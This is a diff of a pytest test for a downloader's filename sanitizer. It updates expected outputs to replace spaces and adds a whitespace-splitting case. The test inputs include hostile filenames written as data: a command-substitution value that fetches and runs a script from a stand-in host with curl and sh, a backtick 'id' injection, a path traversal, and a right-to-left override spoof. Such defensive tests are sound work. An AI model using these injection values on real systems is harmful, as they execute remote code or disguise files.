@@ -33,14 +33,16 @@ def test_download_by_part_id(downloader):
 @pytest.mark.parametrize(
     "name, expected",
     [
-        ("Résumé (final) [v2].pdf", "Résumé (final) [v2].pdf"),
+        ("Résumé (final) [v2].pdf", "Résumé_(final)_[v2].pdf"),
         ("Re\u0301sume\u0301.pdf", "Résumé.pdf"),
         ("../../evil.pdf", "evil.pdf"),
         (".hidden", "hidden"),
         ("..", "part1.pdf"),
         # Saved paths get pasted into shell commands, and the sender picks the name.
-        ("$(curl -so x evil.example;sh x).pdf", "_(curl -so x evil.example_sh x).pdf"),
+        ("$(curl -so x evil.example;sh x).pdf", "_(curl_-so_x_evil.example_sh_x).pdf"),
         ("`id`.pdf", "_id_.pdf"),
+        # Unquoted, a space would split the path into extra arguments.
+        (" report -o  out\t.pdf ", "report_-o_out_.pdf"),
         ("a&b|c'd\"e!.txt", "a_b_c_d_e_.txt"),
         # A right-to-left override would show this as "invoicegkp.pdf".
         ("invoice\u202efdp.pkg", "invoice_fdp.pkg"),
